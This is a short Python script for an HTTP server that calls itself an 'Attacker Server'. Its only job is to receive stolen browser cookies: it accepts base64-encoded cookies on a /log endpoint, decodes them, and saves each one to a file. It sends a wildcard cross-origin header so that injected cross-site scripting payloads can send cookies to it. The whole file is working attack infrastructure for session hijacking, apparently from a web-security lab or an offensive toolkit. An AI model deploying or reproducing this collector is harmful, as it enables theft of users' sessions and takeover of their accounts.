import os
import base64
from http.server import HTTPServer, BaseHTTPRequestHandler
from urllib.parse import urlparse, parse_qs

COOKIE_DIR = os.path.join(os.path.dirname(__file__), 'cookie')

if not os.path.exists(COOKIE_DIR):
    os.makedirs(COOKIE_DIR)

class CookieLoggerHandler(BaseHTTPRequestHandler):
    def do_GET(self):
        parsed_url = urlparse(self.path)
        if parsed_url.path == '/log':
            query = parse_qs(parsed_url.query)
            cookie_b64 = query.get('c', [None])[0]
            
            if cookie_b64:
                try:
                    # Replace space with + if base64 padding was lost or modified
                    cookie_b64 = cookie_b64.replace(' ', '+')
                    cookie = base64.b64decode(cookie_b64).decode('utf-8')
                    filename = f"cookie_{len(os.listdir(COOKIE_DIR)) + 1}.txt"
                    filepath = os.path.join(COOKIE_DIR, filename)
                    with open(filepath, 'w') as f:
                        f.write(cookie)
                    print(f"[+] Cookie captured and saved to {filepath}")
                    
                    self.send_response(200)
                    self.send_header('Access-Control-Allow-Origin', '*')
                    self.end_headers()
                    self.wfile.write(b"Captured")
                    return
                except Exception as e:
                    print(f"[-] Error decoding cookie: {e}")
                    self.send_response(400)
                    self.end_headers()
                    self.wfile.write(b"Error")
                    return
            
            self.send_response(400)
            self.end_headers()
            self.wfile.write(b"Missing cookie")
        else:
            self.send_response(404)
            self.end_headers()

def run(server_class=HTTPServer, handler_class=CookieLoggerHandler, port=7000):
    server_address = ('', port)
    httpd = server_class(server_address, handler_class)
    print(f"[*] Attacker Server starting on port {port}...")
    httpd.serve_forever()

if __name__ == '__main__':
    run()
